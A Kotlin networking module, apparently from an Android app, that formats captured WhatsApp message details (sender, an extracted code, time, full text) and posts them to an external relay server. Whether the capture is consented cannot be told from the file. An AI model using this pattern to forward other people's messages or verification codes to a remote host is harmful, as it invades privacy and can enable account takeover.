package com.vorht.capture.net

import com.google.gson.Gson
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.TimeUnit
import kotlin.coroutines.resume

/**
 * Delivers captured WhatsApp details to the team chat via the carla relay:
 *
 *   POST https://carla.codedynasty.dev
 *   Headers: Idempotency-Key: <uuid>
 *   Body: { "project": "<whatsapp sender name>", "message": "<capture details>" }
 *
 * Any 2xx or 409 (duplicate) counts as delivered.
 * Non-blocking coroutine transport strictly bounded by per-attempt timeoutMs.
 */
object CarlaDelivery {

    private val json = "application/json; charset=utf-8".toMediaType()

    private val client = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .build()

    private val gson = Gson()

    fun formatMessage(
        sender: String,
        code: String?,
        detectedAt: Long,
        eventId: String,
        text: String,
    ): String {
        val isoTime = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).apply {
            timeZone = TimeZone.getTimeZone("UTC")
        }.format(Date(detectedAt))

        return buildString {
            appendLine("VORHT CAPTURE")
            appendLine("From: $sender")
            appendLine("Code: ${code ?: "NONE"}")
            appendLine("At: $isoTime")
            appendLine("Event: $eventId")
            append("Text: $text")
        }
    }

    /**
     * Executes an asynchronous HTTP POST with strict timeout bounding.
     * Cancels the underlying OkHttp call if timeoutMs expires or the coroutine is cancelled.
     */
    suspend fun send(
        project: String,
        message: String,
        eventId: String,
        timeoutMs: Long,
    ): Boolean {
        if (timeoutMs <= 0L) return false

        return withTimeoutOrNull(timeoutMs) {
            suspendCancellableCoroutine { continuation ->
                val payload = gson.toJson(
                    mapOf(
                        "project" to project.take(120),
                        "message" to message.take(3500),
                    )
                )
                val request = Request.Builder()
                    .url(VorhtEndpoints.CARLA)
                    .header("Idempotency-Key", eventId)
                    .post(payload.toRequestBody(json))
                    .build()

                val call = client.newCall(request)
                continuation.invokeOnCancellation {
                    call.cancel()
                }

                call.enqueue(object : Callback {
                    override fun onResponse(call: Call, response: Response) {
                        response.use {
                            val success = response.isSuccessful || response.code == 409
                            if (continuation.isActive) {
                                continuation.resume(success)
                            }
                        }
                    }

                    override fun onFailure(call: Call, e: IOException) {
                        if (continuation.isActive) {
                            continuation.resume(false)
                        }
                    }
                })
            }
        } ?: false
    }
}
